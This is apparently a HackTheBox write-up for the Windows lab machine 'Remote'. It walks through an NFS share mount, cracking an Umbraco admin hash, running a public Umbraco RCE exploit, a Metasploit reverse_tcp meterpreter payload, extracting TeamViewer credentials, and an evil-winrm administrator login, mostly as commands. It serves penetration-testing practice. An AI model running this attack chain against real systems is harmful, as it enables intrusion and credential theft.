# remote

| Key | Value |
|-----|-------|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Easy |

## Recon

```
10.10.10.180

PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

## Exploitation

NFS share accessible:

```bash
showmount -e 10.10.10.180
mount -t nfs 10.10.10.180:/site_backups /mnt
```

Found Umbraco.sdf with admin hash, cracked to `baconandcheese`.

Login: `admin@htb.local : baconandcheese` at http://10.10.10.180/Umbraco

RCE via Umbraco exploit:

```bash
git clone https://github.com/noraj/Umbraco-RCE
python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'hostname; pwd; whoami'
```

Got meterpreter via web_delivery:

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
```

## Privilege Escalation

TeamViewer installed - extract saved creds:

```
use post/windows/gather/credentials/teamviewer_passwords
set session 1
exploit
# Found Unattended Password: !R3m0te!
```

```bash
evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180
```
